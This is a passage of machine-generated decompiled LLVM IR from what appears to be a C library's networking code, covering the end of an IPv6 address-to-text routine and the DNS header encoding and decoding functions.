  %v0_169dc = phi i32 [ -1, %dec_label_pc_1698c ], [ %v0_16a10, %dec_label_pc_169e8 ]
  %v0_169cc = phi i32 [ -1, %dec_label_pc_1698c ], [ %v0_169fc, %dec_label_pc_169e8 ]
  %v0_169b0 = phi i32 [ -1, %dec_label_pc_1698c ], [ %v0_169b08, %dec_label_pc_169e8 ]
  %v0_169e8 = phi i32 [ 0, %dec_label_pc_1698c ], [ %v1_169e8, %dec_label_pc_169e8 ]
  %v4_169a0 = mul nuw nsw i32 %v0_169e8, 4
  %v5_169a0 = add i32 %v4_169a0, %v25_16908
  %v1_169a4 = add i32 %v5_169a0, -32
  %v2_169a4 = inttoptr i32 %v1_169a4 to i32*
  %v3_169a4 = load i32, i32* %v2_169a4, align 4
  %v2_169a8 = icmp eq i32 %v3_169a4, 0
  %v7_169b0 = icmp eq i32 %v0_169b0, -1
  br i1 %v2_169a8, label %dec_label_pc_169b0, label %dec_label_pc_169c4

dec_label_pc_169b0:                               ; preds = %dec_label_pc_1699c
  br i1 %v7_169b0, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_169b0
  store i32 %v0_169e8, i32* %r2.global-to-local, align 4
  store i32 1, i32* @r4, align 4
  br label %dec_label_pc_169e8

.thread:                                          ; preds = %dec_label_pc_169b0
  %v1_169bc.pre = load i32, i32* @r4, align 4
  %v2_169bc = add i32 %v1_169bc.pre, 1
  store i32 %v2_169bc, i32* @r4, align 4
  br label %dec_label_pc_169e8

dec_label_pc_169c4:                               ; preds = %dec_label_pc_1699c
  br i1 %v7_169b0, label %dec_label_pc_169e8, label %dec_label_pc_169cc

dec_label_pc_169cc:                               ; preds = %dec_label_pc_169c4
  %v7_169cc = icmp eq i32 %v0_169cc, -1
  %v0_169e0.pre = load i32, i32* @r4, align 4
  %v1_169d4 = load i32, i32* @r7, align 4
  %v7_169d8 = icmp sgt i32 %v0_169e0.pre, %v1_169d4
  %or.cond = or i1 %v7_169cc, %v7_169d8
  br i1 %or.cond, label %dec_label_pc_169dc, label %dec_label_pc_169e4

dec_label_pc_169dc:                               ; preds = %dec_label_pc_169cc
  store i32 %v0_169dc, i32* @r6, align 4
  store i32 %v0_169e0.pre, i32* @r7, align 4
  br label %dec_label_pc_169e4

dec_label_pc_169e4:                               ; preds = %dec_label_pc_169cc, %dec_label_pc_169dc
  %v0_169cc13 = phi i32 [ %v0_169dc, %dec_label_pc_169dc ], [ %v0_169cc, %dec_label_pc_169cc ]
  store i32 -1, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_169e8

dec_label_pc_169e8:                               ; preds = %bb, %.thread, %dec_label_pc_169c4, %dec_label_pc_169e4
  %v0_16a10 = phi i32 [ %v0_169dc, %.thread ], [ %v0_169e8, %bb ], [ %v0_169dc, %dec_label_pc_169c4 ], [ -1, %dec_label_pc_169e4 ]
  %v0_169b08 = phi i32 [ %v0_169b0, %.thread ], [ %v0_169e8, %bb ], [ -1, %dec_label_pc_169c4 ], [ -1, %dec_label_pc_169e4 ]
  %v0_169fc = phi i32 [ %v0_169cc, %.thread ], [ %v0_169cc, %bb ], [ %v0_169cc, %dec_label_pc_169c4 ], [ %v0_169cc13, %dec_label_pc_169e4 ]
  %v1_169e8 = add nuw nsw i32 %v0_169e8, 1
  store i32 %v1_169e8, i32* %r1.global-to-local, align 4
  %v7_169f0 = icmp slt i32 %v1_169e8, 8
  br i1 %v7_169f0, label %dec_label_pc_1699c, label %dec_label_pc_169f4

dec_label_pc_169f4:                               ; preds = %dec_label_pc_169e8
  %v7_169f4 = icmp eq i32 %v0_16a10, -1
  br i1 %v7_169f4, label %dec_label_pc_16a14, label %dec_label_pc_169fc

dec_label_pc_169fc:                               ; preds = %dec_label_pc_169f4
  %v7_169fc = icmp eq i32 %v0_169fc, -1
  %v0_16a0c.pre = load i32, i32* @r4, align 4
  br i1 %v7_169fc, label %dec_label_pc_16a0c, label %dec_label_pc_16a04

dec_label_pc_16a04:                               ; preds = %dec_label_pc_169fc
  %v1_16a04 = load i32, i32* @r7, align 4
  %v7_16a08 = icmp sgt i32 %v0_16a0c.pre, %v1_16a04
  br i1 %v7_16a08, label %dec_label_pc_16a0c, label %dec_label_pc_16a14

dec_label_pc_16a0c:                               ; preds = %dec_label_pc_169fc, %dec_label_pc_16a04
  store i32 %v0_16a0c.pre, i32* @r7, align 4
  store i32 %v0_16a10, i32* @r6, align 4
  br label %dec_label_pc_16a14

dec_label_pc_16a14:                               ; preds = %dec_label_pc_16a04, %dec_label_pc_169f4, %dec_label_pc_16a0c
  %v0_16a14 = phi i32 [ %v0_169fc, %dec_label_pc_16a04 ], [ %v0_169fc, %dec_label_pc_169f4 ], [ %v0_16a10, %dec_label_pc_16a0c ]
  %v7_16a14 = icmp eq i32 %v0_16a14, -1
  br i1 %v7_16a14, label %bb49, label %dec_label_pc_16a1c

dec_label_pc_16a1c:                               ; preds = %dec_label_pc_16a14
  %v0_16a1c = load i32, i32* @r7, align 4
  %v7_16a20 = icmp slt i32 %v0_16a1c, 2
  br i1 %v7_16a20, label %bb48, label %bb49

bb48:                                             ; preds = %dec_label_pc_16a1c
  store i32 -1, i32* @r6, align 4
  br label %bb49

bb49:                                             ; preds = %dec_label_pc_16a14, %dec_label_pc_16a1c, %bb48
  %v0_16a3023 = phi i32 [ %v0_16a14, %dec_label_pc_16a14 ], [ %v0_16a14, %dec_label_pc_16a1c ], [ -1, %bb48 ]
  %v2_16a24 = ptrtoint i32* %stack_var_-110 to i32
  store i32 %v2_16a24, i32* @r4, align 4
  %v9_16a90 = icmp eq i32 %tmp, 65535
  store i32 0, i32* @r5, align 4
  %v7_16a3063 = icmp eq i32 %v0_16a3023, -1
  br label %dec_label_pc_16a30

dec_label_pc_16a30:                               ; preds = %bb49, %dec_label_pc_16ae4
  %v7_16a3067 = phi i1 [ %v7_16a3063, %bb49 ], [ %v7_16a30, %dec_label_pc_16ae4 ]
  %v0_16a5c66 = phi i32 [ 0, %bb49 ], [ %v1_16ae4, %dec_label_pc_16ae4 ]
  %v1_16a4c65 = phi i32 [ %v0_16a3023, %bb49 ], [ %v0_16a30.pre, %dec_label_pc_16ae4 ]
  %v3_16a6464 = phi i32 [ %v2_16a24, %bb49 ], [ %v3_16a5424, %dec_label_pc_16ae4 ]
  br i1 %v7_16a3067, label %dec_label_pc_16a5c, label %dec_label_pc_16a38

dec_label_pc_16a38:                               ; preds = %dec_label_pc_16a30
  %v9_16a38 = icmp eq i32 %v0_16a5c66, %v1_16a4c65
  %v5_16a3c = icmp slt i32 %v0_16a5c66, %v1_16a4c65
  br i1 %v5_16a3c, label %dec_label_pc_16a5c, label %dec_label_pc_16a40

dec_label_pc_16a40:                               ; preds = %dec_label_pc_16a38
  %v1_16a40 = load i32, i32* @r7, align 4
  %v2_16a40 = add i32 %v1_16a40, %v1_16a4c65
  %v6_16a48 = icmp slt i32 %v0_16a5c66, %v2_16a40
  br i1 %v6_16a48, label %dec_label_pc_16a4c, label %dec_label_pc_16a5c

dec_label_pc_16a4c:                               ; preds = %dec_label_pc_16a40
  br i1 %v9_16a38, label %bb51, label %dec_label_pc_16ae4

bb51:                                             ; preds = %dec_label_pc_16a4c
  %v4_16a54 = inttoptr i32 %v3_16a6464 to i8*
  store i8 58, i8* %v4_16a54, align 1
  %v5_16a54 = load i32, i32* @r4, align 4
  %v6_16a54 = add i32 %v5_16a54, 1
  store i32 %v6_16a54, i32* @r4, align 4
  br label %dec_label_pc_16ae4

dec_label_pc_16a5c:                               ; preds = %dec_label_pc_16a40, %dec_label_pc_16a38, %dec_label_pc_16a30
  %v2_16a5c = icmp eq i32 %v0_16a5c66, 0
  br i1 %v2_16a5c, label %.thread3, label %bb52

bb52:                                             ; preds = %dec_label_pc_16a5c
  %v4_16a64 = inttoptr i32 %v3_16a6464 to i8*
  store i8 58, i8* %v4_16a64, align 1
  %v5_16a64 = load i32, i32* @r4, align 4
  %v6_16a64 = add i32 %v5_16a64, 1
  store i32 %v6_16a64, i32* @r4, align 4
  %v0_16a68.pre = load i32, i32* @r5, align 4
  br label %.thread3

.thread3:                                         ; preds = %dec_label_pc_16a5c, %bb52
  %v0_16aa8 = phi i32 [ %v3_16a6464, %dec_label_pc_16a5c ], [ %v6_16a64, %bb52 ]
  %v1_16acc = phi i32 [ 0, %dec_label_pc_16a5c ], [ %v0_16a68.pre, %bb52 ]
  %v7_16a68 = icmp eq i32 %v1_16acc, 6
  br i1 %v7_16a68, label %dec_label_pc_16a70, label %dec_label_pc_16ac8

dec_label_pc_16a70:                               ; preds = %.thread3
  %v0_16a70 = load i32, i32* @r6, align 4
  %v2_16a70 = icmp eq i32 %v0_16a70, 0
  br i1 %v2_16a70, label %dec_label_pc_16a78, label %dec_label_pc_16ac8

dec_label_pc_16a78:                               ; preds = %dec_label_pc_16a70
  %v0_16a78 = load i32, i32* @r7, align 4
  %v7_16a78 = icmp eq i32 %v0_16a78, 6
  br i1 %v7_16a78, label %dec_label_pc_16a98, label %dec_label_pc_16a80

dec_label_pc_16a80:                               ; preds = %dec_label_pc_16a78
  %v7_16a80 = icmp eq i32 %v0_16a78, 5
  br i1 %v7_16a80, label %dec_label_pc_16a88, label %dec_label_pc_16ac8

dec_label_pc_16a88:                               ; preds = %dec_label_pc_16a80
  store i32 %tmp, i32* %r2.global-to-local, align 4
  br i1 %v9_16a90, label %dec_label_pc_16a98, label %dec_label_pc_16ac8

dec_label_pc_16a98:                               ; preds = %dec_label_pc_16a88, %dec_label_pc_16a78
  %v2_16a9c = sub i32 %v25_16908, %v0_16aa8
  %v0_16aa0 = load i32, i32* @r8, align 4
  %v1_16aa0 = add i32 %v0_16aa0, 12
  %v1_16aa4 = add i32 %v2_16a9c, -32
  store i32 %v1_16aa4, i32* %r2.global-to-local, align 4
  store i32 %v0_16aa8, i32* %r1.global-to-local, align 4
  %v3_16aac = call i32 @inet_ntop4(i32 %v1_16aa0, i32 %v0_16aa8, i32 %v1_16aa4)
  %v2_16ab0 = icmp eq i32 %v3_16aac, 0
  br i1 %v2_16ab0, label %dec_label_pc_16b3c, label %dec_label_pc_16ab8

dec_label_pc_16ab8:                               ; preds = %dec_label_pc_16a98
  %v0_16ab8 = load i32, i32* @r4, align 4
  %v1_16ab8 = inttoptr i32 %v0_16ab8 to i8*
  %v3_16abc = call i32 @strlen(i8* %v1_16ab8)
  %v0_16ac0 = load i32, i32* @r4, align 4
  %v2_16ac0 = add i32 %v0_16ac0, %v3_16abc
  store i32 %v2_16ac0, i32* @r4, align 4
  %v0_16af8.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_16af8

dec_label_pc_16ac8:                               ; preds = %dec_label_pc_16a88, %dec_label_pc_16a80, %dec_label_pc_16a70, %.thread3
  %v4_16acc = mul i32 %v1_16acc, 4
  %v5_16acc = add i32 %v4_16acc, %v25_16908
  store i32 %v0_16aa8, i32* @r0, align 4
  %v1_16ad4 = add i32 %v5_16acc, -32
  %v2_16ad4 = inttoptr i32 %v1_16ad4 to i32*
  %v3_16ad4 = load i32, i32* %v2_16ad4, align 4
  store i32 %v3_16ad4, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_1b0c0.925 to i32), i32* %r1.global-to-local, align 4
  %v7_16adc = call i32 @sprintf(i32 %v0_16aa8, i32 ptrtoint ([3 x i8]* @global_var_1b0c0.925 to i32), i32 %v3_16ad4, i32 %v5_16acc, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  %v0_16ae0 = load i32, i32* @r4, align 4
  %v2_16ae0 = add i32 %v0_16ae0, %v7_16adc
  store i32 %v2_16ae0, i32* @r4, align 4
  br label %dec_label_pc_16ae4

dec_label_pc_16ae4:                               ; preds = %dec_label_pc_16a4c, %bb51, %dec_label_pc_16ac8
  %v3_16a5424 = phi i32 [ %v3_16a6464, %dec_label_pc_16a4c ], [ %v6_16a54, %bb51 ], [ %v2_16ae0, %dec_label_pc_16ac8 ]
  %v0_16ae4 = load i32, i32* @r5, align 4
  %v1_16ae4 = add i32 %v0_16ae4, 1
  %v0_16a30.pre = load i32, i32* @r6, align 4
  store i32 %v1_16ae4, i32* @r5, align 4
  %v7_16aec = icmp slt i32 %v1_16ae4, 8
  %v7_16a30 = icmp eq i32 %v0_16a30.pre, -1
  br i1 %v7_16aec, label %dec_label_pc_16a30, label %dec_label_pc_16af0

dec_label_pc_16af0:                               ; preds = %dec_label_pc_16ae4
  br i1 %v7_16a30, label %.thread4, label %dec_label_pc_16af8

dec_label_pc_16af8:                               ; preds = %dec_label_pc_16af0, %dec_label_pc_16ab8
  %v3_16b04 = phi i32 [ %v3_16a5424, %dec_label_pc_16af0 ], [ %v2_16ac0, %dec_label_pc_16ab8 ]
  %v0_16af8 = phi i32 [ %v0_16a30.pre, %dec_label_pc_16af0 ], [ %v0_16af8.pre, %dec_label_pc_16ab8 ]
  %v1_16af8 = load i32, i32* @r7, align 4
  %v2_16af8 = add i32 %v1_16af8, %v0_16af8
  %v7_16afc = icmp eq i32 %v2_16af8, 8
  br i1 %v7_16afc, label %bb53, label %.thread4

bb53:                                             ; preds = %dec_label_pc_16af8
  %v4_16b04 = inttoptr i32 %v3_16b04 to i8*
  store i8 58, i8* %v4_16b04, align 1
  %v5_16b04 = load i32, i32* @r4, align 4
  %v6_16b04 = add i32 %v5_16b04, 1
  store i32 %v6_16b04, i32* @r4, align 4
  br label %.thread4

.thread4:                                         ; preds = %dec_label_pc_16af8, %dec_label_pc_16af0, %bb53
  %v2_16b0c = phi i32 [ %v3_16b04, %dec_label_pc_16af8 ], [ %v3_16a5424, %dec_label_pc_16af0 ], [ %v6_16b04, %bb53 ]
  store i32 0, i32* %r5.global-to-local, align 4
  %v3_16b0c = inttoptr i32 %v2_16b0c to i8*
  store i8 0, i8* %v3_16b0c, align 1
  %v4_16b0c = load i32, i32* @r4, align 4
  %v5_16b0c = add i32 %v4_16b0c, 1
  store i32 %v2_16a24, i32* %r1.global-to-local, align 4
  %v2_16b14 = sub i32 %v5_16b0c, %v2_16a24
  %v1_16b18 = load i32, i32* @sl, align 4
  %tmp69 = icmp ugt i32 %v2_16b14, %v1_16b18
  br i1 %tmp69, label %dec_label_pc_16b20, label %dec_label_pc_16b34

dec_label_pc_16b20:                               ; preds = %.thread4
  %v0_16b20 = call i32 @__errno_location()
  %v0_16b28 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_16b28, i32* %r2.global-to-local, align 4
  %v2_16b2c = inttoptr i32 %v0_16b20 to i32*
  store i32 28, i32* %v2_16b2c, align 4
  %v0_16b54.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_16b54

dec_label_pc_16b34:                               ; preds = %.thread4
  %v0_16b34 = load i32, i32* @sb, align 4
  %v2_16b38 = bitcast i32* %stack_var_-110 to i8*
  %v3_16b38 = call i32 @strcpy(i32 %v0_16b34, i8* %v2_16b38)
  br label %dec_label_pc_16b3c

dec_label_pc_16b3c:                               ; preds = %dec_label_pc_16a98, %dec_label_pc_16930, %dec_label_pc_16b34
  %v0_16b3c = phi i32 [ 0, %dec_label_pc_16a98 ], [ %v3_1693c, %dec_label_pc_16930 ], [ %v3_16b38, %dec_label_pc_16b34 ]
  store i32 %v0_16b3c, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_16b54

dec_label_pc_16b44:                               ; preds = %dec_label_pc_16924
  %v0_16b44 = call i32 @__errno_location()
  %v2_16b4c = inttoptr i32 %v0_16b44 to i32*
  store i32 97, i32* %v2_16b4c, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_16b54

dec_label_pc_16b54:                               ; preds = %dec_label_pc_16b3c, %dec_label_pc_16b20, %dec_label_pc_16b44
  %v0_16b54 = phi i32 [ %v0_16b3c, %dec_label_pc_16b3c ], [ %v0_16b54.pre, %dec_label_pc_16b20 ], [ 0, %dec_label_pc_16b44 ]
  store i32 %v6_16908, i32* %r5.global-to-local, align 4
  ret i32 %v0_16b54

; uselistorder directives
  uselistorder i1 %v7_16a30, { 1, 0 }
  uselistorder i32 %v0_16a30.pre, { 1, 0, 2 }
  uselistorder i32 %v1_16ae4, { 1, 0, 2 }
  uselistorder i32 %v0_16aa8, { 4, 3, 1, 0, 2 }
  uselistorder i32 %v3_16a6464, { 0, 3, 2, 1 }
  uselistorder i32 %v1_16a4c65, { 2, 0, 1 }
  uselistorder i32 %v0_16a5c66, { 3, 2, 0, 1 }
  uselistorder i32 %v2_16a24, { 2, 1, 0, 3 }
  uselistorder i32 %v0_16a3023, { 1, 0 }
  uselistorder i32 %v0_16a14, { 1, 2, 0 }
  uselistorder i32 %v1_169e8, { 1, 2, 0 }
  uselistorder i32 %v0_169fc, { 1, 2, 0, 3 }
  uselistorder i32 %v0_16a10, { 1, 2, 0, 3 }
  uselistorder i1 %v7_169b0, { 1, 0 }
  uselistorder i32 %v0_169e8, { 2, 1, 0, 3, 4 }
  uselistorder i32 %v0_169cc, { 2, 3, 4, 0, 1 }
  uselistorder i32 %v0_169dc, { 3, 1, 0, 2 }
  uselistorder i32 %v2_16980, { 2, 1, 0 }
  uselistorder i32 %v1_16960, { 3, 1, 4, 0, 2 }
  uselistorder i32 %v25_16908, { 0, 3, 1, 2 }
  uselistorder i32* %stack_var_-32, { 1, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 12, 11, 13, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 9, 8, 6, 7, 0 }
  uselistorder i32 97, { 5, 6, 10, 0, 1, 9, 7, 2, 3, 4, 8 }
  uselistorder i32 (i32, i8*)* @strcpy, { 0, 1, 2, 4, 3 }
  uselistorder i32 (i32, i32, i32, i32, i32, i32)* @sprintf, { 2, 0, 1 }
  uselistorder i8 58, { 1, 2, 3, 4, 5, 0 }
  uselistorder i32 (i8*, i32)* @__GI_memset, { 0, 1, 12, 14, 15, 7, 24, 22, 19, 23, 8, 2, 3, 4, 13, 5, 6, 9, 10, 11, 16, 17, 18, 20, 21 }
  uselistorder i32 (i32, i32, i32)* @inet_ntop4, { 1, 0 }
  uselistorder i32 %arg4, { 1, 0, 2 }
  uselistorder i32 %arg3, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_16b54, { 2, 0, 1 }
  uselistorder label %dec_label_pc_16b3c, { 2, 0, 1 }
  uselistorder label %.thread4, { 2, 0, 1 }
  uselistorder label %dec_label_pc_16ae4, { 2, 1, 0 }
  uselistorder label %.thread3, { 1, 0 }
  uselistorder label %dec_label_pc_16a30, { 1, 0 }
  uselistorder label %bb49, { 2, 1, 0 }
  uselistorder label %dec_label_pc_16a14, { 2, 0, 1 }
  uselistorder label %dec_label_pc_16a0c, { 1, 0 }
  uselistorder label %dec_label_pc_169e8, { 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_169e4, { 1, 0 }
  uselistorder label %dec_label_pc_1699c, { 1, 0 }
  uselistorder label %dec_label_pc_16970, { 1, 0 }
}

define i32 @__encode_header(i32* %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %lr.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  %stack_var_-8 = alloca i32, align 4
  %v3_16b6c = load i32, i32* @r4, align 4
  store i32 %v3_16b6c, i32* %stack_var_-8, align 4
  store i32 %tmp, i32* %lr.global-to-local, align 4
  store i32 %arg2, i32* %r4.global-to-local, align 4
  %v7_16b7c = icmp sgt i32 %arg3, 11
  br i1 %v7_16b7c, label %dec_label_pc_16b80, label %dec_label_pc_16c48

dec_label_pc_16b80:                               ; preds = %entry
  %tmp18 = inttoptr i32 %arg2 to i8*
  %v1_16b80 = add i32 %tmp, 1
  %v2_16b80 = inttoptr i32 %v1_16b80 to i8*
  %v3_16b80 = load i8, i8* %v2_16b80, align 1
  store i8 %v3_16b80, i8* %tmp18, align 1
  %v2_16b88 = load i32, i32* %arg1, align 4
  %v1_16b8c = trunc i32 %v2_16b88 to i8
  %v4_16b8c = add i32 %arg2, 1
  %v5_16b8c = inttoptr i32 %v4_16b8c to i8*
  store i8 %v1_16b8c, i8* %v5_16b8c, align 1
  %v0_16b90 = load i32, i32* %lr.global-to-local, align 4
  %v1_16b90 = add i32 %v0_16b90, 12
  %v2_16b90 = inttoptr i32 %v1_16b90 to i32*
  %v3_16b90 = load i32, i32* %v2_16b90, align 4
  %v1_16b94 = add i32 %v0_16b90, 4
  %v2_16b94 = inttoptr i32 %v1_16b94 to i32*
  %v3_16b94 = load i32, i32* %v2_16b94, align 4
  %v1_16b98 = add i32 %v0_16b90, 16
  %v2_16b98 = inttoptr i32 %v1_16b98 to i32*
  %v3_16b98 = load i32, i32* %v2_16b98, align 4
  %v1_16b9c = add i32 %tmp, 8
  %v2_16b9c = inttoptr i32 %v1_16b9c to i32*
  %v3_16b9c = load i32, i32* %v2_16b9c, align 4
  %v2_16ba0 = icmp eq i32 %v3_16b90, 0
  %. = select i1 %v2_16ba0, i32 0, i32 4
  %v2_16bac = icmp eq i32 %v3_16b94, 0
  %v1_16bb0 = add i32 %v0_16b90, 20
  %v2_16bb0 = inttoptr i32 %v1_16bb0 to i32*
  %v3_16bb0 = load i32, i32* %v2_16bb0, align 4
  store i32 %v3_16bb0, i32* @ip, align 4
  %storemerge12 = select i1 %v2_16bac, i32 0, i32 128
  %v1_16bbc = urem i32 %v3_16b9c, 16
  %v2_16bc0 = icmp eq i32 %v3_16b98, 0
  %.29 = select i1 %v2_16bc0, i32 0, i32 2
  %v4_16bcc = mul nuw nsw i32 %v1_16bbc, 8
  %v5_16bcc = or i32 %v4_16bcc, %.
  %v2_16bd0 = icmp eq i32 %v3_16bb0, 0
  br i1 %v2_16bd0, label %bb26, label %bb25

bb25:                                             ; preds = %dec_label_pc_16b80
  %v2_16bd4 = or i32 %v5_16bcc, 1
  br label %bb26

bb26:                                             ; preds = %dec_label_pc_16b80, %bb25
  %v1_16bdc = phi i32 [ %v5_16bcc, %dec_label_pc_16b80 ], [ %v2_16bd4, %bb25 ]
  %v2_16bd8 = or i32 %.29, %storemerge12
  %v2_16bdc = or i32 %v2_16bd8, %v1_16bdc
  %v1_16be0 = trunc i32 %v2_16bdc to i8
  %v2_16be0 = load i32, i32* %r4.global-to-local, align 4
  %v3_16be0 = add i32 %v2_16be0, 2
  %v4_16be0 = inttoptr i32 %v3_16be0 to i8*
  store i8 %v1_16be0, i8* %v4_16be0, align 1
  %v0_16be4 = load i32, i32* %lr.global-to-local, align 4
  %v1_16be4 = add i32 %v0_16be4, 24
  %v1_16be8 = inttoptr i32 %v1_16be4 to i32*
  %v2_16be8 = load i32, i32* %v1_16be8, align 4
  %v3_16be8 = add i32 %v0_16be4, 28
  %v4_16be8 = inttoptr i32 %v3_16be8 to i32*
  %v5_16be8 = load i32, i32* %v4_16be8, align 4
  %v2_16bec = icmp eq i32 %v2_16be8, 0
  %v1_16bf0 = urem i32 %v5_16be8, 16
  %.30 = select i1 %v2_16bec, i32 0, i32 128
  %v2_16bfc = or i32 %v1_16bf0, %.30
  %v1_16c00 = trunc i32 %v2_16bfc to i8
  %v2_16c00 = load i32, i32* %r4.global-to-local, align 4
  %v3_16c00 = add i32 %v2_16c00, 3
  %v4_16c00 = inttoptr i32 %v3_16c00 to i8*
  store i8 %v1_16c00, i8* %v4_16c00, align 1
  %v0_16c04 = load i32, i32* %lr.global-to-local, align 4
  %v1_16c04 = add i32 %v0_16c04, 33
  %v2_16c04 = inttoptr i32 %v1_16c04 to i8*
  %v3_16c04 = load i8, i8* %v2_16c04, align 1
  %v2_16c08 = load i32, i32* %r4.global-to-local, align 4
  %v3_16c08 = add i32 %v2_16c08, 4
  %v4_16c08 = inttoptr i32 %v3_16c08 to i8*
  store i8 %v3_16c04, i8* %v4_16c08, align 1
  %v0_16c0c = load i32, i32* %lr.global-to-local, align 4
  %v1_16c0c = add i32 %v0_16c0c, 32
  %v2_16c0c = inttoptr i32 %v1_16c0c to i32*
  %v3_16c0c = load i32, i32* %v2_16c0c, align 4
  %v1_16c10 = trunc i32 %v3_16c0c to i8
  %v2_16c10 = load i32, i32* %r4.global-to-local, align 4
  %v3_16c10 = add i32 %v2_16c10, 5
  %v4_16c10 = inttoptr i32 %v3_16c10 to i8*
  store i8 %v1_16c10, i8* %v4_16c10, align 1
  %v0_16c14 = load i32, i32* %lr.global-to-local, align 4
  %v1_16c14 = add i32 %v0_16c14, 37
  %v2_16c14 = inttoptr i32 %v1_16c14 to i8*
  %v3_16c14 = load i8, i8* %v2_16c14, align 1
  %v2_16c18 = load i32, i32* %r4.global-to-local, align 4
  %v3_16c18 = add i32 %v2_16c18, 6
  %v4_16c18 = inttoptr i32 %v3_16c18 to i8*
  store i8 %v3_16c14, i8* %v4_16c18, align 1
  %v0_16c1c = load i32, i32* %lr.global-to-local, align 4
  %v1_16c1c = add i32 %v0_16c1c, 36
  %v2_16c1c = inttoptr i32 %v1_16c1c to i32*
  %v3_16c1c = load i32, i32* %v2_16c1c, align 4
  %v1_16c20 = trunc i32 %v3_16c1c to i8
  %v2_16c20 = load i32, i32* %r4.global-to-local, align 4
  %v3_16c20 = add i32 %v2_16c20, 7
  %v4_16c20 = inttoptr i32 %v3_16c20 to i8*
  store i8 %v1_16c20, i8* %v4_16c20, align 1
  %v0_16c24 = load i32, i32* %lr.global-to-local, align 4
  %v1_16c24 = add i32 %v0_16c24, 41
  %v2_16c24 = inttoptr i32 %v1_16c24 to i8*
  %v3_16c24 = load i8, i8* %v2_16c24, align 1
  %v2_16c28 = load i32, i32* %r4.global-to-local, align 4
  %v3_16c28 = add i32 %v2_16c28, 8
  %v4_16c28 = inttoptr i32 %v3_16c28 to i8*
  store i8 %v3_16c24, i8* %v4_16c28, align 1
  %v0_16c2c = load i32, i32* %lr.global-to-local, align 4
  %v1_16c2c = add i32 %v0_16c2c, 40
  %v2_16c2c = inttoptr i32 %v1_16c2c to i32*
  %v3_16c2c = load i32, i32* %v2_16c2c, align 4
  %v1_16c30 = trunc i32 %v3_16c2c to i8
  %v2_16c30 = load i32, i32* %r4.global-to-local, align 4
  %v3_16c30 = add i32 %v2_16c30, 9
  %v4_16c30 = inttoptr i32 %v3_16c30 to i8*
  store i8 %v1_16c30, i8* %v4_16c30, align 1
  %v0_16c34 = load i32, i32* %lr.global-to-local, align 4
  %v1_16c34 = add i32 %v0_16c34, 45
  %v2_16c34 = inttoptr i32 %v1_16c34 to i8*
  %v3_16c34 = load i8, i8* %v2_16c34, align 1
  %v2_16c38 = load i32, i32* %r4.global-to-local, align 4
  %v3_16c38 = add i32 %v2_16c38, 10
  %v4_16c38 = inttoptr i32 %v3_16c38 to i8*
  store i8 %v3_16c34, i8* %v4_16c38, align 1
  %v0_16c3c = load i32, i32* %lr.global-to-local, align 4
  %v1_16c3c = add i32 %v0_16c3c, 44
  %v2_16c3c = inttoptr i32 %v1_16c3c to i32*
  %v3_16c3c = load i32, i32* %v2_16c3c, align 4
  %v1_16c40 = trunc i32 %v3_16c3c to i8
  %v2_16c40 = load i32, i32* %r4.global-to-local, align 4
  %v3_16c40 = add i32 %v2_16c40, 11
  %v4_16c40 = inttoptr i32 %v3_16c40 to i8*
  store i8 %v1_16c40, i8* %v4_16c40, align 1
  %v2_16c4c.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_16c48

dec_label_pc_16c48:                               ; preds = %entry, %bb26
  %v2_16c4c = phi i32 [ %v3_16b6c, %entry ], [ %v2_16c4c.pre, %bb26 ]
  %v0_16c48 = phi i32 [ -1, %entry ], [ 12, %bb26 ]
  store i32 %v2_16c4c, i32* @r4, align 4
  ret i32 %v0_16c48

; uselistorder directives
  uselistorder i32 %tmp, { 0, 2, 1 }
  uselistorder i32 45, { 1, 0 }
  uselistorder i32 37, { 2, 1, 0 }
  uselistorder i32 33, { 2, 1, 0 }
  uselistorder i32 %arg2, { 0, 2, 1 }
  uselistorder label %dec_label_pc_16c48, { 1, 0 }
  uselistorder label %bb26, { 1, 0 }
}

define i32 @__decode_header(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg1 to i32
  %v3_16c50 = load i8, i8* %arg1, align 1
  %v4_16c50 = zext i8 %v3_16c50 to i32
  %v2_16c54 = add i32 %tmp, 1
  %v3_16c54 = inttoptr i32 %v2_16c54 to i8*
  %v4_16c54 = load i8, i8* %v3_16c54, align 1
  %v5_16c54 = zext i8 %v4_16c54 to i32
  %v4_16c58 = mul nuw nsw i32 %v4_16c50, 256
  %v5_16c58 = or i32 %v5_16c54, %v4_16c58
  %v2_16c5c = inttoptr i32 %arg2 to i32*
  store i32 %v5_16c58, i32* %v2_16c5c, align 4
  %v2_16c60 = add i32 %tmp, 2
  %v3_16c60 = inttoptr i32 %v2_16c60 to i8*
  %v4_16c60 = load i8, i8* %v3_16c60, align 1
  %tmp4 = icmp slt i8 %v4_16c60, 0
  %v3_16c64 = zext i1 %tmp4 to i32
  %v2_16c68 = add i32 %arg2, 4
  %v3_16c68 = inttoptr i32 %v2_16c68 to i32*
  store i32 %v3_16c64, i32* %v3_16c68, align 4
  %v4_16c6c = load i8, i8* %v3_16c60, align 1
  %div = udiv i8 %v4_16c6c, 8
  %tmp5 = urem i8 %div, 16
  %v1_16c74 = zext i8 %tmp5 to i32
  %v2_16c78 = add i32 %arg2, 8
  %v3_16c78 = inttoptr i32 %v2_16c78 to i32*
  store i32 %v1_16c74, i32* %v3_16c78, align 4
  %v4_16c7c = load i8, i8* %v3_16c60, align 1
  %div1 = udiv i8 %v4_16c7c, 4
  %tmp6 = urem i8 %div1, 2
